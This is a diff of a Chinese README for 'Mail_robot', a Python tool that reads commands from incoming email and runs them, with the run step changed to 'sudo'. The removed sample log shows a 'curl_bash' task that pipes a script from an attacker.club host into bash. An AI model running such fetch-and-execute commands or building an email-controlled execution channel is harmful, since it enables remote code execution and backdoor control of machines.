@@ -1,14 +1,20 @@
 # Mail_robot
 
-#### 介绍
+## 介绍
 
 通过邮件接收指令
 
-## 环境
+### 环境
 
 ![Python](https://img.shields.io/badge/python-3.6+-blue.svg?style=plastic)
+![Jinja2](https://img.shields.io/badge/Jinja2-2.11.2+-blue.svg?style=plastic)
+![beautifulsoup4](https://img.shields.io/badge/beautifulsoup4-4.9.0+-blue.svg?style=plastic)
 
-## 发送指令到监听邮箱
+```bash
+pip install jinja2  beautifulsoup4
+```
+
+### 发送指令到监听邮箱
 
 ```mail
 task: curl_bash
@@ -18,17 +24,26 @@ task: curl_bash
 ## 执行任务
 
 ```bash
-python main.py
+sudo python main.py
 ```
 
 打印输出
 
 ```log
-Message: 5条. Size: 40104
-From: admin <admin@attacker.club>
-To: alert@xxxxx.com <alert@xxxxx.com>
-Subject: 回复：测试
-Date: Sun, 19 Apr 2020 23:37:45 +0800
-curl_bash
-[+] [curl -s http://list.attacker.club/touch.sh | bash] 任务执行中 ...
+已连接服务器
+成功登陆邮箱
+待处理邮件: 0
+没有邮件处理
+登出邮件系统
+没有发件人
+dict_items([('task', 'Null'), ('code', '未接收到命令!!!')])
+继续监听邮件...
 ```
+
+### 例子
+
+**发送指令:**
+![发送](doc/send.jpeg)
+
+**返回处理结果:**
+![返回](doc/return.jpeg)
